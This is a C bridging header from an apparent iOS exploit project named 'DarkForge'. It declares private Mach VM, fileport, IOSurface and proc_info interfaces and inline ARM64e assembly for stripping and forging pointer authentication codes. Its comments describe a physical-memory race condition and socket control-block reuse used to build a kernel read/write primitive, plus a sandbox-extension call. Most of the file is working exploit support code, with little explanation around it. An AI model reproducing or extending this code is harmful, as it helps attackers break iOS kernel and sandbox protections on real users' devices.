// ===----------------------------------------------------------------------===//
//
// DarkForge-Bridging-Header.h
//
// C interoperability header for the DarkForge runtime.
//
// Swift cannot directly call many low-level Mach and BSD APIs because they
// are not exposed in the Swift module maps. This bridging header exposes:
//
//   1. Mach VM functions (mach_vm_map, mach_vm_allocate, mach_vm_deallocate)
//      These are in <mach/mach_vm.h> but not bridged to Swift by default.
//      We need them to manipulate virtual memory mappings, which is the core
//      of the race condition exploit.
//
//   2. File port functions (fileport_makeport, fileport_makefd)
//      These convert between file descriptors and Mach ports. The exploit
//      uses them to hold socket references as Mach ports so that sockets
//      can be closed (freeing their file descriptors for reuse) while keeping
//      the underlying socket object alive via the port reference.
//
//   3. IOSurfacePrefetchPages - Forces IOSurface pages into physical memory.
//      Not declared in public headers but available in the IOSurface framework.
//
//   4. proc_info_syscall wrapper - Calls syscall 336 (proc_info) which lets
//      us query per-socket information, specifically the inp_gencnt that
//      uniquely identifies each protocol control block (PCB).
//
//   5. xpaci - ARM64e pointer authentication code (PAC) stripping instruction.
//      Kernel pointers are signed with PAC on A12+ devices. We must strip the
//      PAC bits before using a pointer value for arithmetic.
//
//   6. memset64 - Fills memory with a 64-bit pattern. Used to fill the
//      physically contiguous mapping with a random marker so we can detect
//      when the race condition succeeds (the marker will be replaced by
//      kernel data).
//
// ===----------------------------------------------------------------------===//

#ifndef DarkForge_Bridging_Header_h
#define DarkForge_Bridging_Header_h

// ---------------------------------------------------------------------------
// System includes
// ---------------------------------------------------------------------------

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/arm/thread_status.h>

// ARM64 thread state constants
#ifndef ARM_THREAD_STATE64
#define ARM_THREAD_STATE64 6
#endif
#ifndef ARM_THREAD_STATE64_COUNT
#define ARM_THREAD_STATE64_COUNT ((mach_msg_type_number_t)(sizeof(arm_thread_state64_t) / sizeof(natural_t)))
#endif

// Exception behavior constants
#ifndef EXCEPTION_STATE_IDENTITY64
#define EXCEPTION_STATE_IDENTITY64 (7)  // EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES
#endif

// Mach message bit manipulation
static inline mach_msg_bits_t MACH_MSGH_BITS_HELPER(mach_msg_bits_t remote, mach_msg_bits_t local) {
    return (remote) | ((local) << 8);
}
#include <mach-o/dyld.h>

// fileport_t is not in public iOS headers — it's a mach_port_t typedef
typedef mach_port_t fileport_t;

// ---------------------------------------------------------------------------
// Mach VM functions
// ---------------------------------------------------------------------------
// These are the core VM manipulation primitives. They operate on the Mach
// virtual memory subsystem and allow us to:
//   - Allocate virtual address ranges (mach_vm_allocate)
//   - Map memory objects into address ranges (mach_vm_map)
//   - Deallocate/free address ranges (mach_vm_deallocate)
//
// mach_vm_map is especially critical: when called with VM_FLAGS_FIXED |
// VM_FLAGS_OVERWRITE, it atomically replaces the pages at a given address
// with pages from a different memory object. The race condition exploits
// the brief window where the old pages are freed but the file I/O is still
// referencing their physical addresses.
// ---------------------------------------------------------------------------

kern_return_t mach_vm_map(
    vm_map_t target_task,
    mach_vm_address_t *address,
    mach_vm_size_t size,
    mach_vm_offset_t mask,
    int flags,
    mem_entry_name_port_t object,
    memory_object_offset_t offset,
    boolean_t copy,
    vm_prot_t cur_protection,
    vm_prot_t max_protection,
    vm_inherit_t inheritance
);

kern_return_t mach_vm_allocate(
    vm_map_t target,
    mach_vm_address_t *address,
    mach_vm_size_t size,
    int flags
);

kern_return_t mach_vm_protect(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    boolean_t set_maximum,
    vm_prot_t new_protection
);

kern_return_t mach_vm_deallocate(
    vm_map_t target,
    mach_vm_address_t address,
    mach_vm_size_t size
);

// ---------------------------------------------------------------------------
// File port conversion functions
// ---------------------------------------------------------------------------
// fileport_makeport: Converts a file descriptor into a Mach port. This
//   allows us to close the fd (freeing it for reuse by subsequent socket()
//   calls) while retaining a reference to the underlying file/socket object
//   through the Mach port.
//
// fileport_makefd: Converts a Mach port back into a file descriptor. Used
//   after we've identified which socket is our control socket, to get an fd
//   we can use with getsockopt/setsockopt for the kernel read/write
//   primitive.
// ---------------------------------------------------------------------------

int fileport_makeport(int fd, fileport_t *port);
int fileport_makefd(fileport_t port);

// ---------------------------------------------------------------------------
// IOSurface private API
// ---------------------------------------------------------------------------
// IOSurfacePrefetchPages is an undocumented function that forces all pages
// backing an IOSurface to be faulted into physical memory. We use this in
// surface_mlock() to ensure the wired pages are resident so that our
// physical memory scanning finds the socket PCBs.
// ---------------------------------------------------------------------------

#include <IOSurface/IOSurfaceRef.h>
void IOSurfacePrefetchPages(IOSurfaceRef surface);

// ---------------------------------------------------------------------------
// proc_info system call (syscall 336)
// ---------------------------------------------------------------------------
// The proc_info system call provides rich introspection of process state.
// We use it with:
//   callnum = 6 (PROC_INFO_CALL_PIDFDINFO)
//   pid     = getpid()
//   flavor  = 3 (PROC_PIDFDSOCKETINFO)
//   arg     = the fileport (treated as an fd identifier)
//
// The returned structure contains the socket's inp_gencnt at offset 0x110.
// inp_gencnt is a monotonically increasing generation counter that uniquely
// identifies each inpcb (Internet protocol control block). We use this to
// match PCBs found in physical memory back to our known sockets.
// ---------------------------------------------------------------------------

// syscall() is deprecated but still functional on iOS. We suppress the warning
// since there is no public replacement for proc_info (syscall 336).
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
static inline int proc_info_syscall(int callnum, int pid, int flavor,
                                    uint64_t arg, void *buffer, int buffersize)
{
    return syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize);
}
#pragma clang diagnostic pop

// ---------------------------------------------------------------------------
// ARM64e PAC stripping: xpaci
// ---------------------------------------------------------------------------
// On ARM64e (A12+), kernel pointers are signed with Pointer Authentication
// Codes (PAC). The upper bits of a pointer contain a cryptographic signature.
// Before we can use a leaked kernel pointer for address arithmetic (e.g.,
// finding the kernel base), we must strip the PAC bits.
//
// XPACI (Strip Pointer Authentication Code, Instruction key) zeros out the
// PAC bits of a pointer, leaving only the virtual address.
//
// The instruction encoding 0xDAC143E0 is: XPACI X0
// On non-arm64e, this is a no-op (pointers have no PAC bits).
// ---------------------------------------------------------------------------

// ARM64e PAC stripping: xpaci
// Now built as arm64e, so we can use the instruction name directly.
static inline uint64_t xpaci(uint64_t ptr) __attribute__((always_inline));
static inline uint64_t xpaci(uint64_t ptr) {
    __asm__ __volatile__(
        "mov x0, %[input]\n"
        "xpaci x0\n"
        "mov %[output], x0\n"
        : [output] "=r" (ptr)
        : [input] "r" (ptr)
        : "x0"
    );
    return ptr;
}

// ---------------------------------------------------------------------------
// ARM64e PAC signing: pacia / pacib
// ---------------------------------------------------------------------------
static inline uint64_t pacia_sign(uint64_t ptr, uint64_t ctx) __attribute__((always_inline));
static inline uint64_t pacia_sign(uint64_t ptr, uint64_t ctx) {
    uint64_t result;
    __asm__ __volatile__(
        "mov x9, %[ptr]\n"
        "mov x10, %[ctx]\n"
        "pacia x9, x10\n"
        "mov %[out], x9\n"
        : [out] "=r" (result)
        : [ptr] "r" (ptr), [ctx] "r" (ctx)
        : "x9", "x10"
    );
    return result;
}

static inline uint64_t pacib_sign(uint64_t ptr, uint64_t ctx) __attribute__((always_inline));
static inline uint64_t pacib_sign(uint64_t ptr, uint64_t ctx) {
    uint64_t result;
    __asm__ __volatile__(
        "mov x9, %[ptr]\n"
        "mov x10, %[ctx]\n"
        "pacib x9, x10\n"
        "mov %[out], x9\n"
        : [out] "=r" (result)
        : [ptr] "r" (ptr), [ctx] "r" (ctx)
        : "x9", "x10"
    );
    return result;
}

// ---------------------------------------------------------------------------
// trigger_bad_access — raw LDR from address 0 to cause EXC_BAD_ACCESS
// ---------------------------------------------------------------------------
// On arm64e, Swift safety checks intercept null derefs before they become
// hardware faults. This inline asm bypasses Swift and triggers a real
// EXC_BAD_ACCESS that Mach exception ports can catch.
static inline void trigger_bad_access(void) {
    __asm__ __volatile__(
        "mov x8, #0\n"
        "ldr x8, [x8]\n"
        ::: "x8", "memory"
    );
}

// ---------------------------------------------------------------------------
// memset64 - Fill memory with a 64-bit pattern
// ---------------------------------------------------------------------------
// Standard memset only fills with a single byte. We need to fill memory with
// a full 64-bit marker value so that we can detect when physical pages have
// been replaced by kernel allocations (the marker will be overwritten).
//
// This is used to fill the physically contiguous mapping with randomMarker.
// During the race condition read, if we read back something other than
// randomMarker, it means the race succeeded and we're reading from a
// different physical page (potentially containing kernel data).
// ---------------------------------------------------------------------------

static inline void memset64(void *ptr, uint64_t val, size_t size) {
    uint8_t *ptr8 = (uint8_t *)ptr;
    for (uint64_t idx = 0; idx < size; idx += sizeof(uint64_t)) {
        uint64_t *ptr64 = (uint64_t *)&ptr8[idx];
        *ptr64 = val;
    }
}

// ---------------------------------------------------------------------------
// Sandbox extension (private API)
// ---------------------------------------------------------------------------
int sandbox_extension_consume(const char *token);

#endif /* DarkForge_Bridging_Header_h */
